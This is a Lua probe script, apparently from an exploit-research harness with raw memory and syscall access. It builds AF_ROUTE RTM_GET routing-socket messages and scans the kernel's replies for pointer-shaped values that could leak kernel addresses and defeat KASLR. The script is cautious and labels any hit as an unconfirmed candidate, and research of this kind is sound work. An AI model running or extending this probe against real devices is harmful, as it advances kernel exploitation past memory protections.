-- CRASH_CLASS: MODERATE
-- PROBE 53b: Rebuild AF_ROUTE RTM_GET headers and classify each response.
-- Reopens: results/43o_afroute_kaslr_20261016_180647.txt records write ret=-1;
-- its 108-byte read echoed the request (sockaddr began at +0x5C, matching hdr=92).
-- A successful write or a pointer-shaped value is a candidate observation, not a finding.

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end

local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
end

local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local function safe_rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end

local function safe_wb(addr, val)
    return pcall(function() memory.write_byte(addr, val % 256) end)
end

local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local function put_u16(addr, value)
    safe_wb(addr, value)
    safe_wb(addr + 1, math.floor(value / 256))
end

local function put_u32(addr, value)
    safe_wb(addr, value)
    safe_wb(addr + 1, math.floor(value / 0x100))
    safe_wb(addr + 2, math.floor(value / 0x10000))
    safe_wb(addr + 3, math.floor(value / 0x1000000))
end

local function read_u16(addr)
    return (safe_rb(addr) or 0) + 256 * (safe_rb(addr + 1) or 0)
end

local function read_u32(addr)
    return (safe_rb(addr) or 0) + 0x100 * (safe_rb(addr + 1) or 0)
        + 0x10000 * (safe_rb(addr + 2) or 0) + 0x1000000 * (safe_rb(addr + 3) or 0)
end

local function make_buf(size)
    local buf = memory.alloc(size)
    for i = 0, size - 1 do safe_wb(buf + i, 0) end
    return buf
end

local function make_request(hdr, seq, pid)
    local total = hdr + 16
    local msg = make_buf(total)
    put_u16(msg, total)            -- rtm_msglen
    safe_wb(msg + 2, 5)            -- RTM_VERSION
    safe_wb(msg + 3, 4)            -- RTM_GET
    put_u32(msg + 8, 0x1)          -- RTF_UP
    put_u32(msg + 0x0C, 0x1)       -- RTA_DST
    put_u32(msg + 0x10, pid)       -- rtm_pid
    put_u32(msg + 0x14, seq)       -- rtm_seq
    put_u32(msg + 0x18, 0)         -- rtm_errno
    safe_wb(msg + hdr, 16)         -- sockaddr_in.sin_len
    safe_wb(msg + hdr + 1, 2)      -- sockaddr_in.sin_family = AF_INET
    -- Remaining sockaddr bytes stay zero: destination 0.0.0.0.
    return msg, total
end

local function same_bytes(a, b, length)
    for i = 0, length - 1 do
        local av = safe_rb(a + i)
        local bv = safe_rb(b + i)
        if av == nil or bv == nil then return nil end
        if av ~= bv then return false end
    end
    return true
end

local function inspect_response(buf, length, sent_requests)
    local kind
    for _, sent in ipairs(sent_requests) do
        local identical = same_bytes(buf, sent.buf, math.min(length, sent.length))
        if length == sent.length and identical == true then
            kind = "ECHO of request variant " .. sent.variant .. " (rejected as a response)"
            break
        elseif length <= sent.length and length > 0 and identical == true then
            kind = "PARTIAL PREFIX ECHO of request variant " .. sent.variant
            break
        elseif identical == nil then
            kind = "UNCLASSIFIED (response bytes could not all be read)"
        end
    end
    kind = kind or "CANDIDATE RESPONSE (inspect fields and provenance)"
    print("  response kind: " .. kind)
    if length >= 28 then
        print(string.format("  header: msglen=%d version=%d type=%d flags=0x%X addrs=0x%X pid=%d seq=%d errno=%d",
            read_u16(buf), safe_rb(buf + 2) or 0, safe_rb(buf + 3) or 0,
            read_u32(buf + 8), read_u32(buf + 0x0C), read_u32(buf + 0x10),
            read_u32(buf + 0x14), read_u32(buf + 0x18)))
    else
        print("  response shorter than 28-byte parse window; header fields not classified")
    end

    local count = 0
    for off = 0, length - 8, 8 do
        local q = safe_rq(buf + off)
        if q then
            local hi, lo = get_hi_lo(q)
            if hi >= 0xFFFF8000 and hi ~= 0xFFFFFFFF then
                count = count + 1
                print(string.format("  pointer-shaped qword +0x%03X: %08X_%08X (candidate)", off, hi, lo))
            end
        end
    end
    print("  pointer-shaped qwords: " .. count .. " (requires independent validation)")

    local dump_len = math.min(length, 160)
    for row = 0, dump_len - 1, 16 do
        local hex = ""
        for col = 0, 15 do
            if row + col < dump_len then hex = hex .. string.format("%02X ", safe_rb(buf + row + col) or 0) end
        end
        print(string.format("  +%03X: %s", row, hex))
    end
    return kind
end

print("=== PROBE 53b: AF_ROUTE RTM_GET RETEST ===")
local sc_socket = make_syscall(97)
local sc_write = make_syscall(4)
local sc_recvmsg = make_syscall(27)
local sc_close = make_syscall(6)
local sc_getpid = make_syscall(20)
local MSG_DONTWAIT = 0x80

local pid = 0
local pid_ok, pid_ret = pcall(function() return sc_getpid() end)
if pid_ok then pid = to_num(pid_ret) end
print("pid=" .. pid)

print("BEFORE socket(PF_ROUTE=17, SOCK_RAW=3, protocol=0)")
local sock_ok, fd_ret = pcall(function()
    return sc_socket(uint64(17), uint64(3), uint64(0), uint64(0), uint64(0), uint64(0))
end)
local fd = sock_ok and signed32(fd_ret) or -1
print(string.format("socket result: %s fd=%d", sock_ok and "RETURNED" or "LUA-ERROR", fd))
if fd < 0 then
    print("CONCLUSION: route socket unavailable; RTM_GET delivery not tested")
    print("=== PROBE 53b COMPLETE ===")
    return
end

print("Receive mode: recvmsg(MSG_DONTWAIT=0x80); prior probes report F_SETFL as cosmetic")

local function recv_nonblocking(buf, size)
    local iov = memory.alloc(16)
    local mh = memory.alloc(64)
    for off = 0, 56, 8 do memory.write_qword(mh + off, uint64(0)) end
    memory.write_qword(iov, uint64(buf))
    memory.write_qword(iov + 8, uint64(size))
    memory.write_qword(mh + 16, uint64(iov)) -- msg_iov
    memory.write_qword(mh + 24, uint64(1))   -- msg_iovlen
    return sc_recvmsg(uint64(fd), uint64(mh), uint64(MSG_DONTWAIT))
end

local delivered = 0
local response_kinds = {}
local sent_requests = {}
for index, hdr in ipairs({120, 92, 152}) do
    local msg, total = make_request(hdr, index, pid)
    sent_requests[#sent_requests + 1] = {buf=msg, length=total, variant=index}
    print(string.format("variant hdr=%d msglen=%d: BEFORE write(fd=%d)", hdr, total, fd))
    local write_ok, write_ret = pcall(function()
        return sc_write(uint64(fd), uint64(msg), uint64(total), uint64(0), uint64(0), uint64(0))
    end)
    local wrv = write_ok and signed32(write_ret) or -999
    print(string.format("variant hdr=%d: write result=%s ret=%d", hdr, write_ok and "RETURNED" or "LUA-ERROR", wrv))

    if write_ok and wrv > 0 then
        delivered = delivered + 1
        local response_seen = false
        for attempt = 1, 5 do
            local rbuf = make_buf(4096)
            print(string.format("variant hdr=%d read attempt %d/5: BEFORE recvmsg(MSG_DONTWAIT)", hdr, attempt))
            local read_ok, read_ret = pcall(function()
                return recv_nonblocking(rbuf, 4096)
            end)
            local rlen = read_ok and signed32(read_ret) or -999
            print(string.format("variant hdr=%d read attempt %d: %s ret=%d",
                hdr, attempt, read_ok and "RETURNED" or "LUA-ERROR", rlen))
            if read_ok and rlen > 0 then
                local safe_len = math.min(rlen, 4096)
                local kind = inspect_response(rbuf, safe_len, sent_requests)
                response_kinds[#response_kinds + 1] = kind
                response_seen = true
                if not string.find(kind, "ECHO", 1, true) then break end
            end
        end
        if not response_seen then print(string.format("variant hdr=%d: no response captured in five non-blocking receives", hdr)) end
    else
        print(string.format("variant hdr=%d: WRITE FAILED (not delivered); response classification skipped", hdr))
    end
end

local control = make_buf(8)
put_u16(control, 8)
safe_wb(control + 2, 5)
safe_wb(control + 3, 4)
print("control msglen=8: BEFORE write")
local ctrl_ok, ctrl_ret = pcall(function()
    return sc_write(uint64(fd), uint64(control), uint64(8), uint64(0), uint64(0), uint64(0))
end)
print(string.format("control write: %s ret=%d", ctrl_ok and "RETURNED" or "LUA-ERROR", ctrl_ok and signed32(ctrl_ret) or -999))
pcall(function() sc_close(uint64(fd)) end)

if delivered == 0 then
    print("CONCLUSION: all RTM_GET writes failed; delivery and leak behavior remain untested")
else
    print(string.format("CONCLUSION: %d RTM_GET variant(s) returned a positive write; inspect response-kind lines before drawing a conclusion", delivered))
end
print("=== PROBE 53b COMPLETE ===")
